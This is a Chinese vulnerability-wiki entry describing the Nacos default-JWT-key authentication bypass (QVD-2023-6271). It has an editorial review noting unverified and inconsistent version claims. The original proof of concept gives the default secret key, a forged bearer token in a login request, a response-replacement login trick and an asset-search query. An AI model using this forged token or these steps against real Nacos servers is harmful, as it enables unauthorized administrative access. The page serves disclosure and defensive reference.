---
source: "wy876 漏洞文库"
title: "Nacos默认key导致权限绕过登陆漏洞"
product: "Nacos JWT认证"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "QVD-2023-6271"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "认证启用且默认key未改，已存在对应sub用户；版本要按认证实现确认"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-c2a34434ebe5fde51fb15224"
entity_id: "ve-b50ed791f7e4032cc4a957ac"
schema_version: "1"
canonical: "Web安全/中间件/Alibaba Nacos/Nacos默认key导致权限绕过登陆漏洞 附POC.md"
relation_type: "duplicate_of"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"Nacos\""
---

# Nacos默认key导致权限绕过登陆漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：认证启用且默认key未改，已存在对应sub用户；版本要按认证实现确认
- 证据范围：比23多给默认key，但构造JWT步骤空白；替换浏览器响应只改变前端，应验证后端API

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 简介<=2.1.0与影响0.1.0–2.2.0不一致且早期版本范围缺依据
- token.secret.key可配置，固定死表述不准确
- 缺补丁/密钥轮换/会话处置；fofa误抽Hunter残缺
- 与23相同token/错误密码/替换响应流程应归同组

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</font><font style="color:rgba(0, 0, 0, 0.9);">Nacos中发现影响Nacos <= 2.1.0的问题，</font><font style="color:rgb(51, 51, 51);">nacos在默认情况下未对token.secret.key进行修改，导致攻击者可以绕过密钥认证进入后台。</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">0.1.0 <= Nacos <= 2.2.0</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征


# 四、漏洞复现
1. <font style="color:rgb(51, 51, 51);">Nacos的token.secret.key值是固定死的</font>

```plain
nacos/conf/application.properties   //位于该文件中

SecretKey012345678901234567890123456789012345678901234567890123456789
```

2. 构造JWT


3. <font style="color:rgb(51, 51, 51);">构造数据包获取accesstoken</font>

```http
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 
Content-Length: 28
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=nacos&password=1111
```


4. 登录系统

<font style="color:rgb(51, 51, 51);">将返回包内容全部复制，然后在登陆时抓包，拦截返回包替换，然后发包即可登录后台</font>

<font style="color:rgb(51, 51, 51);">在账号密码错误的情况下返回包为403</font>


<font style="color:rgb(51, 51, 51);">将拦截的返回包替换为之前的返回包内容</font>


<font style="color:rgb(51, 51, 51);">发包之后成功登录后台</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pg7g9r320fwlmxap>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
